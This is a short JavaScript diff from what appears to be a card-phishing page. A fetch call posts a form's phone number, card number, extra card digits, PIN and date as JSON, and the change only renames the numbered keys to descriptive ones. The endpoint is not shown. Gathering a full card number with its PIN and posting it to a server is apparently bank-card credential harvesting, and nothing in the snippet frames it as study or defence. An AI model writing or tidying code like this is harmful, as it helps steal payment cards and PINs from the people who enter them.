@@ -14,11 +14,11 @@ try {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            "1": formulario.telefono.value,
-            "2": formulario.tarjeta.value,
-            "3": formulario.tarjeta2.value,
-            "4": formulario.nip.value,
-            "5": formulario.fecha.value
+            "Telefono": formulario.telefono.value,
+            "Tarjeta": formulario.tarjeta.value,
+            "Digitos": formulario.tarjeta2.value,
+            "Nip": formulario.nip.value,
+            "Fecha": formulario.fecha.value
         })
     });
 
